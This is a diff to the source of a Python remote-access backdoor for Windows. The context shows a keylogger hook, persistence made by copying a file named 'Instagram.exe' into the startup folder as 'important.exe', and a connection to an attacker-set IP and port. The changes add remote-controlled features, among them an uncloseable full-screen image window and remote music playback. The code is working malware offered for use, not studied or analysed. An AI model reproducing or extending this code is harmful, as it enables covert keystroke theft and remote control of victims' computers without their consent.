@@ -14,29 +14,42 @@ from PyQt5.QtWidgets import *
 
 pyautogui.FAILSAFE = False
 
+
 class Window(QMainWindow):
 	def __init__(self):
 		super().__init__()
 		
 		self.setWindowFlags(Qt.WindowStaysOnTopHint)
-
 		self.setObjectName("Window")
 		self.setStyleSheet("#Window { background-color: black; }")
 
-		cursor = QCursor()
-		cursor.setPos(0, 0)
+		monitor = QDesktopWidget().screenGeometry(0)
+		self.move(monitor.left(), monitor.top())
+
+		self.label = QLabel(self)
+
+		pixmap = QPixmap("1.jpg")
+		self.label.setPixmap(pixmap)
+		self.setCentralWidget(self.label)
+		
+		# self.label.setText("YOU'RE HACKED")
+		# font = QFont("Times", 80, QFont.Bold)
+		# self.label.setFont(font)
+		# self.label.setStyleSheet("color: red;")
+		# self.label.adjustSize()
+		
+		# label_size = pixmap.size()
+		# screen_center_x = monitor.size().width() / 2
+		# screen_center_y = monitor.size().height() / 2
+		
+		# self.label.move(screen_center_x - label_size.width() / 2, screen_center_y - label_size.height() / 2)
+		# self.label.move(200, 20)
+
 
 
 	def closeEvent(self, event):
-		# print("alright")
-		# close = QMessageBox.question(self,
-		# 							 "QUIT",
-		# 							 "Are you sure want to stop process?",
-		# 							 QMessageBox.Yes | QMessageBox.No)
-		# if close == QMessageBox.Yes:
-		# 	event.accept()
-		# else:
 		event.ignore()
+
 
 
 def writer(data):
@@ -75,7 +88,6 @@ class Backdoor:
 		self.connection = None
 
 		self.cursor_blocking = False
-		self.music_playing = False
 		self.music_thread = None
 
 		keyboard.on_press(logger)
@@ -159,12 +171,6 @@ class Backdoor:
 		command = f'copy "Instagram.exe" "{startup_path}\\important.exe"'
 		print(command)
 		os.system(command)
-
-
-	def play_music(self, music):
-		self.music_playing = True
-		playsound(music)
-		self.music_playing = False
 
 
 	def show_window(self):
@@ -261,15 +267,23 @@ class Backdoor:
 						self.reliable_send("[-] No key is pressed yet")
 
 				elif command.startswith("play music"):
-					if not self.music_playing:
+					if not self.music_thread:
 						link = "https://mp3bit.cc/5094.mp3"
 						if len(command.split()) > 2:
 							link = command.replace("play music", "").strip()
-						self.music_thread = threading.Thread(target=self.play_music, args=(link,))
+						self.music_thread = multiprocessing.Process(target=playsound, args=(link,))
 						self.music_thread.start()
 						self.reliable_send("[+] Music is playing")
 					else:
-						self.reliable_send("[~] You have to wait for end current music")
+						self.reliable_send("[~] You have to stop current music")
+
+				elif command == "stop music":
+					if self.music_thread:
+						self.music_thread.terminate()
+						self.music_thread = None
+						self.reliable_send("[+] Music stopped")
+					else:
+						self.reliable_send("[~] Music is not playing")
 
 				elif command.split()[0] == "volume":
 					try:
@@ -290,11 +304,11 @@ class Backdoor:
 				elif command == "window":
 					self.window_thread = multiprocessing.Process(target=self.show_window)
 					self.window_thread.start()
-					self.reliable_send("alright")
+					self.reliable_send("[+] Opened")
 					
 				elif command == "close window":
 					self.window_thread.terminate()
-					self.reliable_send("alright")
+					self.reliable_send("[+] Closed")
 					
 
 				else:
@@ -306,7 +320,7 @@ class Backdoor:
 if __name__ == "__main__":
 	from config import IP, PORT
 	multiprocessing.freeze_support()
-	
+
 	backdoor = Backdoor(IP, PORT)
 
 	backdoor_thread = threading.Thread(target=backdoor.connect)
